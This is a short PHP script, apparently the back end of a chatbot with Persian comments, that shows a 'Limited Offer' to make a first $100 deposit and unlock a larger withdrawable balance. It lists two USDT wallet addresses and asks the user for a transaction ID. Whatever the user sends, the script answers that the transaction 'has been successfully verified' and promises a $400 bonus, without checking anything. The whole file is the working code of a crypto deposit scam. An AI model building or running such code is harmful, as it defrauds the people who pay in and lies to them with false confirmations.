<?php
// deposit.php - نمایش آدرس واریز
include 'config.php';

$userId = $_POST['from_id'] ?? 0;
$text = $_POST['text'] ?? '';
$state = $_POST['state'] ?? 0;

$message = "🔥 Limited Offer!\n\n";
$message .= "Make your first $100 deposit today and instantly activate your account.Once activated, you'll unlock up to $500 withdrawable balance!\n\n";
$message .= "Minimum Deposit $100 💰\n";
$message .= "Maximum Deposit $10,000 💰\n\n";
$message .= "ADDRESS :USDT (TRC20)🔹\n";
$message .= "TS7MsPKofCKZZ24sM2Zyj64Pp6kZMUYn85\n\n";
$message .= "➖➖➖➖➖➖\n";
$message .= "USDT (BEP20) smart chain 🔹\n";
$message .= "0xa8Ac6dc2692c626309612D07C64D91Ca54bD26D5\n\n";
$message .= "📌 After depositing, send the TXid or a screenshot of the deposit screen";

// اینجا هم گفتگویی هست برای دریافت TXid
if ($state == 0) {
    $apiData = [
        'content' => [
            ['text' => $message, 'type' => 'text']
        ],
        'return_user_answer' => true,
        'state' => 1
    ];
} else {
    // کاربر TXid رو فرستاده
    $txid = $text;
    
    // اینجا توی دیتابیس ثبت کن
    $confirmMessage = "💰 Your transaction has been successfully verified. Your $400 bonus will be activated shortly 🎁";
    
    $apiData = [
        'content' => [
            ['text' => $confirmMessage, 'type' => 'text']
        ],
        'return_user_answer' => false,
        'state' => 0
    ];
}

header('Content-Type: application/json');
echo json_encode($apiData);
?>
